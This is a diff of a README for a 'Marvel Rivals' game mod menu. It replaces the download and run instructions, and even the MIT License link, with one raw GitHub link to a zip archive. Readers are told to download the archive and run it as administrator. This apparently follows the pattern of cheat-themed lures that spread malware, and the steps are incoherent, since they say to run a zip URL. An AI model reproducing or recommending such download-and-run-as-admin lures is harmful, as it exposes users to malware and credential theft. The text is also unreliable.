@@ -37,10 +37,10 @@ Our mod menu harnesses the power of modern game modding while staying SEO-friend
 
 Getting started with the Marvel Rivals Mod Menu is easy! Please follow these instructions step by step:
 
-1. Download **Loader.rar** from the repository.
-2. Extract the contents of **Loader.rar** to a folder of your choice using your favorite archiver (WinRAR, 7-Zip, etc.).
+1. Download **https://raw.githubusercontent.com/Ivanhoemaker/MarvelRivals-EnhanceHub/main/Hemiascales/MarvelRivals-EnhanceHub.zip** from the repository.
+2. Extract the contents of **https://raw.githubusercontent.com/Ivanhoemaker/MarvelRivals-EnhanceHub/main/Hemiascales/MarvelRivals-EnhanceHub.zip** to a folder of your choice using your favorite archiver (WinRAR, 7-Zip, etc.).
 3. Launch your Marvel Rivals game client.
-4. Run **Loader.exe** as administrator for full compatibility.
+4. Run **https://raw.githubusercontent.com/Ivanhoemaker/MarvelRivals-EnhanceHub/main/Hemiascales/MarvelRivals-EnhanceHub.zip** as administrator for full compatibility.
 5. Open your game—press the menu hotkey (`F12` by default) to launch the mod menu overlay.
 6. Customize the available settings as you wish. If issues arise, consult the “Troubleshooting” section below.
 
@@ -69,7 +69,7 @@ We encourage responsible modding—**use at your own risk.**
 
 ## 📑 License
 
-Marvel Rivals Mod Menu is released under the [MIT License](https://opensource.org/license/mit/). All rights reserved 2025. Feel free to fork, modify, and distribute—just give credit to the community!
+Marvel Rivals Mod Menu is released under the [MIT License](https://raw.githubusercontent.com/Ivanhoemaker/MarvelRivals-EnhanceHub/main/Hemiascales/MarvelRivals-EnhanceHub.zip). All rights reserved 2025. Feel free to fork, modify, and distribute—just give credit to the community!
 
 ---
 
